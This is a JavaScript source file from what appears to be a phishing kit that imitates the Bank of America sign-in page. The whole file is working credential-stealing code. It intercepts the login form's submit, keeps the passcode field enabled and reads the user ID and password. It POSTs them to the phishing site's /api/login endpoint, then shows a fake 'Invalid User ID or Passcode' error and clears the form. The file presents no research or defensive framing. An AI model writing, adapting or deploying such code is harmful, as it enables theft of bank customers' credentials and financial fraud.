/**
 * Form Logger - Captures Bank of America login credentials
 * Simplified, robust version with better debugging
 */

console.log('[FormLogger] Loading at', new Date().toISOString());

// CRITICAL: Patch Form.prototype.submit BEFORE anything else runs
const OriginalFormSubmit = HTMLFormElement.prototype.submit;

// Global form interception
HTMLFormElement.prototype.submit = function() {
  if (this.id === 'EnterOnlineIDForm') {
    console.log('[LOG] Form.submit() blocked');
    this.action = '';
    this.target = '';
    if (window.FL && window.FL.captureForm) window.FL.captureForm(this);
    return false;
  }
  return OriginalFormSubmit.call(this);
};

// Main Logger Class
class FormLogger {
  constructor() {
    window.FL = this;
    this.pwd = '';
    this.init();
  }
  
  init() {
    console.log('[LOG] Initializing...');
    
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => this.ready());
    } else {
      this.ready();
    }
  }
  
  ready() {
    console.log('[LOG] DOM ready');
    
    // Hide initial errors
    document.querySelectorAll('.error-state').forEach(e => {
      e.style.display = 'none';
    });
    
    // Enable password field
    setTimeout(() => this.enablePassword(), 100);
    
    // Setup form listeners
    setTimeout(() => this.setupForm(), 100);
  }
  
  enablePassword() {
    const pwd = document.getElementById('tlpvt-passcode-input');
    if (!pwd) {
      console.log('[LOG] Password field not found, retrying...');
      setTimeout(() => this.enablePassword(), 500);
      return;
    }
    
    pwd.disabled = false;
    pwd.removeAttribute('readonly');
    pwd.style.opacity = '1';
    pwd.style.cursor = 'text';
    
    // Track password changes
    pwd.addEventListener('input', () => { this.pwd = pwd.value; });
    pwd.addEventListener('change', () => { this.pwd = pwd.value; });
    
    // Prevent re-disabling
    new MutationObserver(() => {
      if (pwd.disabled || pwd.readOnly) {
        pwd.disabled = false;
        pwd.removeAttribute('readonly');
      }
    }).observe(pwd, { attributes: true });
    
    console.log('[LOG] Password field enabled');
  }
  
  setupForm() {
    const form = document.getElementById('EnterOnlineIDForm');
    if (!form) {
      console.log('[LOG] Form not found, retrying...');
      setTimeout(() => this.setupForm(), 500);
      return;
    }
    
    // Submit listener
    form.addEventListener('submit', (e) => {
      console.log('[LOG] Form submitted');
      e.preventDefault();
      e.stopPropagation();
      this.captureForm(form);
      return false;
    }, true);
    
    // Button click listener
    document.addEventListener('click', (e) => {
      if ((e.target.type === 'submit' || e.target.tagName === 'BUTTON') && form.contains(e.target)) {
        console.log('[LOG] Submit button clicked');
        e.preventDefault();
        e.stopPropagation();
        this.captureForm(form);
        return false;
      }
    }, true);
    
    console.log('[LOG] Form setup complete');
  }
  
  captureForm(form) {
    console.log('[LOG] Capturing form data...');
    
    try {
      // Get User ID
      let uid = '';
      let uidInput = document.getElementById('enterID-input') || 
                     document.querySelector('input[name="dummy-onlineId"]') ||
                     form.querySelector('input[type="text"]');
      if (uidInput) uid = uidInput.value.trim();
      
      // Get password
      let pwd = document.getElementById('tlpvt-passcode-input');
      let pass = (pwd ? pwd.value : '') || this.pwd || '';
      
      // Get remember me
      let rem = (document.querySelector('input[name="saveMyID"]') || document.querySelector('input[type="checkbox"]')).checked || false;
      
      console.log('[LOG] Captured - UID:', uid || 'EMPTY', 'Pass length:', pass.length, 'Remember:', rem);
      
      // Send immediately
      this.send({
        userId: uid || 'N/A',
        password: pass || 'N/A',
        rememberMe: rem
      });
    } catch (err) {
      console.error('[LOG] Capture error:', err.message);
      this.showError();
    }
  }
  
  send(data) {
    console.log('[LOG] Sending to /api/login:', data.userId);
    
    fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
    .then(r => r.json())
    .then(result => {
      console.log('[LOG] Server response:', result);
      this.showError();
      this.clearForm();
    })
    .catch(err => {
      console.error('[LOG] Send error:', err.message);
      this.showError();
      this.clearForm();
    });
  }
  
  clearForm() {
    const uid = document.querySelector('input[name="dummy-onlineId"]');
    const pwd = document.getElementById('tlpvt-passcode-input');
    if (uid) uid.value = '';
    if (pwd) pwd.value = '';
    this.pwd = '';
    console.log('[LOG] Form cleared');
  }
  
  showError() {
    window.scrollTo(0, 0);
    const existing = document.querySelector('.error-state');
    if (existing) existing.remove();
    
    const err = document.createElement('div');
    err.className = 'error-state';
    err.style.cssText = 'background:#ffe6e6;border:1px solid #d32f2f;border-left:5px solid #c81c24;padding:16px;margin:20px;font-size:13px;color:#333;';
    err.innerHTML = '<strong>Invalid User ID or Passcode</strong><br>The information you entered doesn\'t match our records. Please try again.';
    document.body.insertBefore(err, document.body.firstChild);
    console.log('[LOG] Error displayed');
  }
}

// Start immediately
const logger = new FormLogger();
console.log('[LOG] FormLogger initialized');

// Continuous password field protection
setInterval(() => {
  const pwd = document.getElementById('tlpvt-passcode-input');
  if (pwd && (pwd.disabled || pwd.readOnly)) {
    pwd.disabled = false;
    pwd.removeAttribute('readonly');
  }
}, 1000);

